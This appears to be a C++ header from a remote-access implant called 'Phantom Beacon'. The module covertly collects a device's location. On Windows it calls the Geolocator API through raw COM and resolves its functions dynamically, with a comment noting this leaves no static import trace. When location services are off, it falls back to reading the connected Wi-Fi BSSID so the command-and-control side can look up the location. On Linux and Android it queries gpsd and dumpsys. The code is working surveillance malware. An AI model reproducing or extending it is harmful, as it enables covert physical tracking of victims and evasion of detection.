#pragma once
// ============================================================================
//  gps.h — Phantom Beacon GPS Location Module (Cross-Platform)
//  ─────────────────────────────────────────────────────────
//  Windows: WinRT Windows.Devices.Geolocation.Geolocator activated through
//           raw COM (RoGetActivationFactory) — NO WinRT headers, no CRT.
//           Returns REAL lat/lon when location services are on; falls back
//           to connected-WiFi BSSID diagnostics when they are not.
//  Linux:   GPSD daemon / network location
//  Android: dumpsys location services
// ============================================================================

#include "media_utils.h"
#include <string>
#include <cstdint>

#ifdef _WIN32

#include <windows.h>
#include <objbase.h>
#include <hstring.h>

// Diagnostic builds only (PHANTOM_SHELL_TRACE): GPS step trace into
// %TEMP%\phantom_cam_trace.log. Never compiled into a release beacon.
#ifdef PHANTOM_SHELL_TRACE
#define GPS_TRACE(msg) media_utils::xtrace(msg)
#else
#define GPS_TRACE(msg) do {} while (0)
#endif

namespace media_gps {

// ── minimal WinRT plumbing (flat C ABI only) ────────────────────────────────
namespace wrlite {

// dynamic WinRT string helpers (combase.dll — no static import trace)

inline void** winrt_funcs() {
    static void** fns = nullptr;
    if (fns) return fns;
    HMODULE combase = LoadLibraryA("combase.dll");
    if (!combase) return nullptr;
    static void* table[4] = {nullptr, nullptr, nullptr, nullptr};
    table[0] = (void*)GetProcAddress(combase, "WindowsCreateString");
    table[1] = (void*)GetProcAddress(combase, "WindowsDeleteString");
    table[2] = (void*)GetProcAddress(combase, "RoGetActivationFactory");
    table[3] = (void*)GetProcAddress(combase, "RoInitialize");
    fns = table;
    return fns;
}

// WinRT must be initialized on the CALLING thread. RO_INIT_MULTITHREADED=1;
// S_FALSE (already initialized) and RPC_E_CHANGED_MODE (STA elsewhere) are
// both acceptable, so the return value is deliberately ignored.
inline void ensure_winrt() {
    void** fns = winrt_funcs();
    if (fns && fns[3]) {
        typedef long (__stdcall *FnRoInit)(INT32);
        ((FnRoInit)fns[3])(1);
    }
}

typedef long (__stdcall *FnCreateStr)(const wchar_t*, UINT32, HSTRING*);
typedef long (__stdcall *FnDelStr)(HSTRING);
typedef long (__stdcall *FnRoGet)(HSTRING, const GUID*, void**);

inline bool create_string_w(const wchar_t* wide, HSTRING* out) {
    void** fns = winrt_funcs();
    if (!fns || !fns[0]) return false;
    return SUCCEEDED(((FnCreateStr)fns[0])(wide, (UINT32)wcslen(wide), out));
}

inline void delete_string(HSTRING h) {
    void** fns = winrt_funcs();
    if (fns && fns[1] && h) ((FnDelStr)fns[1])(h);
}

// IActivationFactory IID {00000035-0000-0000-C000-000000000046}. The third
// argument of RoGetActivationFactory is a REFIID — passing an enum (the old
// `0x1`) dereferences address 1 inside combase and faults the task thread.
static const GUID kIID_IActivationFactory = {
    0x00000035, 0x0000, 0x0000,
    {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

inline void* ro_activation_factory(const wchar_t* classId) {
    void** fns = winrt_funcs();
    if (!fns || !fns[2]) return nullptr;
    HSTRING h = nullptr;
    if (!create_string_w(classId, &h)) return nullptr;
    void* factory = nullptr;
    long hr = ((FnRoGet)fns[2])(h, &kIID_IActivationFactory, &factory);
    delete_string(h);
    if (FAILED(hr)) return nullptr;
    return factory;
}

// IUnknown::Release is vtable slot 2 on every WinRT object.
inline void com_release(void* obj) {
    if (!obj) return;
    void** vtbl = *(void***)obj;
    typedef unsigned long (__stdcall *ReleaseFn)(void*);
    ((ReleaseFn)vtbl[2])(obj);
}

// IUnknown/IInspectable dispatch helpers
inline void* vtbl_slot(void* obj, int slot) {
    void** vtbl = *(void***)obj;
    return vtbl[slot];
}

typedef long (__stdcall* QueryIntfFn)(void*, void*, void**);

struct GeopositionBasic {
    double lat; double lon; double acc; long long ts; INT32 src; INT32 sat;
};

inline bool get_position(GeopositionBasic& out, int timeout_ms) {
    char tbuf[256];
    GPS_TRACE("gps:enter");
    ensure_winrt();
    GPS_TRACE("gps:winrt-init");

    // RoGetActivationFactory returns the FACTORY, not a Geolocator. Statics
    // (RequestAccessAsync, history) live on it; GetGeopositionAsync is an
    // INSTANCE method, so activate a Geolocator first:
    // IActivationFactory::ActivateInstance = slot 6.
    void* factory = ro_activation_factory(
        L"Windows.Devices.Geolocation.Geolocator");
    snprintf(tbuf, sizeof(tbuf), "gps:factory=%p", factory);
    GPS_TRACE(tbuf);
    if (!factory) return false;

    typedef long (__stdcall* ActivateFn)(void*, void**);
    auto pActivate = (ActivateFn)vtbl_slot(factory, 6);
    void* locator = nullptr;
    long hrA = pActivate ? pActivate(factory, &locator) : (long)0x80004003L;
    snprintf(tbuf, sizeof(tbuf), "gps:activate hr=%08lx locator=%p",
             (unsigned long)hrA, locator);
    GPS_TRACE(tbuf);
    if (!pActivate || FAILED(hrA) || !locator) {
        com_release(factory);
        return false;
    }

    // IGeolocator: DesiredAccuracy 6/7, MovementThreshold 8/9,
    // ReportInterval 10/11, LocationStatus=12, GetGeopositionAsync()=13.
    typedef long (__stdcall* GetPosFn)(void*, void**);
    auto pGetPos = (GetPosFn)vtbl_slot(locator, 13);
    void* op = nullptr;
    long hrG = pGetPos ? pGetPos(locator, &op) : (long)0x80004003L;
    snprintf(tbuf, sizeof(tbuf), "gps:getpos hr=%08lx op=%p",
             (unsigned long)hrG, op);
    GPS_TRACE(tbuf);
    if (!pGetPos || FAILED(hrG) || !op) {
        com_release(locator);
        com_release(factory);
        return false;
    }

    // The ABI vtable of IAsyncOperation<T> exposes ONLY the async-op members
    // that come AFTER IInspectable: put_Completed=6, get_Completed=7,
    // GetResults=8. The IAsyncInfo members (get_Id/get_Status/.../Close) are
    // NOT flattened into it: they must be reached with
    // QueryInterface(IID_IAsyncInfo). Verified against the MIDLRT-generated
    // __FIAsyncOperation_1_..._GeopositionVtbl in the Windows SDK.
    static const GUID kIID_IAsyncInfo = {
        0x00000036, 0x0000, 0x0000,
        {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

    typedef long (__stdcall* QueryIntfFn)(void*, const GUID*, void**);
    auto pQI = (QueryIntfFn)vtbl_slot(op, 0);
    void* info = nullptr;
    long hrQI = pQI ? pQI(op, &kIID_IAsyncInfo, &info) : (long)0x80004002L;
    snprintf(tbuf, sizeof(tbuf), "gps:qi-asyncinfo hr=%08lx info=%p",
             (unsigned long)hrQI, info);
    GPS_TRACE(tbuf);
    if (!pQI || FAILED(hrQI) || !info) {
        com_release(op); com_release(locator); com_release(factory);
        return false;
    }

    // IAsyncInfo: get_Id=6, get_Status=7, get_ErrorCode=8, Cancel=9, Close=10.
    // IAsyncOperation<T> (on op itself): put_Completed=6, get_Completed=7,
    // GetResults=8.
    typedef long (__stdcall* GetStatusFn)(void*, INT32*);
    typedef long (__stdcall* GetResultsFn)(void*, void**);
    typedef long (__stdcall* CancelFn)(void*);
    auto pStatus = (GetStatusFn)vtbl_slot(info, 7);
    auto pCancel = (CancelFn)vtbl_slot(info, 9);
    auto pResults = (GetResultsFn)vtbl_slot(op, 8);
    snprintf(tbuf, sizeof(tbuf), "gps:slots st=%p rs=%p cancel=%p",
             (void*)pStatus, (void*)pResults, (void*)pCancel);
    GPS_TRACE(tbuf);
    if (!pStatus || !pResults) {
        com_release(info); com_release(op); com_release(locator); com_release(factory);
        return false;
    }

    int waited = 0;
    INT32 status = 0;
    // 0=Started 1=Completed 2=Canceled 3=Error
    while (waited < timeout_ms) {
        if (FAILED(pStatus(info, &status))) {
            snprintf(tbuf, sizeof(tbuf), "gps:status-fail waited=%d", waited);
            GPS_TRACE(tbuf);
            if (pCancel) pCancel(info);
            com_release(info); com_release(op); com_release(locator); com_release(factory);
            return false;
        }
        if (status != 0) break;
        Sleep(200);
        waited += 200;
    }
    snprintf(tbuf, sizeof(tbuf), "gps:status=%ld waited=%d",
             (long)status, waited);
    GPS_TRACE(tbuf);
    if (status != 1) {   // not Completed
        snprintf(tbuf, sizeof(tbuf),
                 "gps:timeout info=%p op=%p locator=%p factory=%p status=%ld",
                 info, op, locator, factory, (long)status);
        GPS_TRACE(tbuf);
        if (pCancel) pCancel(info);
        com_release(info);    GPS_TRACE("gps:rel-info-ok");
        com_release(op);      GPS_TRACE("gps:rel-op-ok");
        com_release(locator); GPS_TRACE("gps:rel-loc-ok");
        com_release(factory); GPS_TRACE("gps:rel-fac-ok");
        return false;
    }

    void* pos = nullptr;
    long hrR = pResults(op, &pos);
    snprintf(tbuf, sizeof(tbuf), "gps:results hr=%08lx pos=%p",
             (unsigned long)hrR, pos);
    GPS_TRACE(tbuf);
    if (FAILED(hrR) || !pos) {
        com_release(info); com_release(op); com_release(locator); com_release(factory);
        return false;
    }

    // IGeoposition: (IUnknown 0-2)(IInspectable 3-5) Coordinate=6 CivicAddress=7
    typedef long (__stdcall* GetCoordFn)(void*, void**);
    auto pCoord = (GetCoordFn)vtbl_slot(pos, 6);
    void* coord = nullptr;
    long hrC = pCoord ? pCoord(pos, &coord) : (long)0x80004003L;
    snprintf(tbuf, sizeof(tbuf), "gps:coord hr=%08lx coord=%p",
             (unsigned long)hrC, coord);
    GPS_TRACE(tbuf);
    if (!pCoord || FAILED(hrC) || !coord) {
        com_release(pos); com_release(info); com_release(op);
        com_release(locator); com_release(factory);
        return false;
    }

    // IGeocoordinate after IInspectable:
    //   get_Latitude=6, get_Longitude=7, get_Altitude=8 (IReference<double>**),
    //   get_Accuracy=9, get_AltitudeAccuracy=10, get_Heading=11, ...
    // PositionSource is NOT on this interface (separate *WithPositionSource
    // interface), so it is reported as unknown (-1).
    typedef long (__stdcall* GetDblFn)(void*, double*);
    auto pLat = (GetDblFn)vtbl_slot(coord, 6);
    auto pLon = (GetDblFn)vtbl_slot(coord, 7);
    auto pAcc = (GetDblFn)vtbl_slot(coord, 9);
    if (!pLat || !pLon) {
        com_release(coord); com_release(pos); com_release(info);
        com_release(op); com_release(locator); com_release(factory);
        return false;
    }
    double lat = 0, lon = 0, acc = 0;
    long hr1 = pLat(coord, &lat);
    long hr2 = pLon(coord, &lon);
    snprintf(tbuf, sizeof(tbuf),
             "gps:latlon hr1=%08lx hr2=%08lx lat=%.6f lon=%.6f",
             (unsigned long)hr1, (unsigned long)hr2, lat, lon);
    GPS_TRACE(tbuf);
    if (FAILED(hr1) || FAILED(hr2)) {
        com_release(coord); com_release(pos); com_release(info);
        com_release(op); com_release(locator); com_release(factory);
        return false;
    }
    if (pAcc) pAcc(coord, &acc);

    out = {lat, lon, acc, 0, -1, 0};

    GPS_TRACE("gps:releasing");
    com_release(coord);
    com_release(pos);
    com_release(info);
    com_release(op);
    com_release(locator);
    com_release(factory);
    GPS_TRACE("gps:released");
    return lat != 0.0 || lon != 0.0;
}

} // namespace wrlite

inline std::string get_gps_info() {
    std::string out;

    wrlite::GeopositionBasic pos{};
    if (wrlite::get_position(pos, 15000)) {
        char buf[256];
        snprintf(buf, sizeof(buf),
                 "GPS: lat=%.6f lon=%.6f acc=%.0fm source=%d\n",
                 pos.lat, pos.lon, pos.acc, pos.src);
        out += buf;
        out += "MAPS: https://www.google.com/maps?q=" +
               std::to_string(pos.lat).substr(0, 10) + "," +
               std::to_string(pos.lon).substr(0, 10) + "\n";
        return out;
    }

    // Fallback diagnostics: why location is unavailable (permission denied,
    // service off, desktop without radios) + the connected-AP BSSID for the
    // C2-side Apple-WLOC lookup (same data `wlan-locate` uses).
    out += "GPS: WinRT location unavailable (permission or service off)\n";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Services\\WwanSvc", 0,
                      KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type = 0, size = sizeof(DWORD), enabled = 0;
        if (RegQueryValueExA(hKey, "Start", nullptr, &type,
                             (LPBYTE)&enabled, &size) == ERROR_SUCCESS) {
            out += "WWAN Service: " + std::to_string(enabled) + "\n";
        }
        RegCloseKey(hKey);
    }
    std::string wifi = media_utils::exec_cmd("netsh wlan show interfaces 2>nul");
    size_t p = wifi.find("BSSID");
    if (p != std::string::npos) {
        size_t end = wifi.find('\n', p);
        out += "ConnectedAP: " + wifi.substr(p, end - p) + "\n";
        out += "HINT: run 'wlan-locate' for BSSID triangulation\n";
    }
    return out;
}

} // namespace media_gps

#else  // !WIN32

namespace media_gps {

inline std::string get_gps_info() {
#if defined(__ANDROID__) || defined(ANDROID)
    std::string out = "GPS: Android platform\n";
    std::string loc = media_utils::exec_cmd(
        "dumpsys location 2>/dev/null | grep -E 'lastFix|latitude|longitude|altitude'");
    if (!loc.empty()) out += loc;
    std::string provider = media_utils::exec_cmd(
        "dumpsys location providers 2>/dev/null | grep -E 'GPS|network'");
    if (!provider.empty()) out += "Providers:\n" + provider;
    return out;
#else
    std::string out = "GPS: Linux platform\n";
    std::string gpsd = media_utils::exec_cmd("gpspipe -w -n 1 2>/dev/null");
    if (!gpsd.empty()) out += "GPSD: " + gpsd + "\n";
    if (media_utils::file_exists("/dev/gps0")) {
        std::string dev = media_utils::exec_cmd("head -n 5 /dev/gps0 2>/dev/null");
        if (!dev.empty()) out += "GPS Device:\n" + dev;
    }
    std::string geo = media_utils::exec_cmd("nmcli -p general 2>/dev/null");
    if (!geo.empty()) out += "NetworkManager:\n" + geo + "\n";
    out += "GPS: No location source available (GPSD, serial GPS, or geoclue required)\n";
    return out;
#endif
}

} // namespace media_gps

#endif // _WIN32
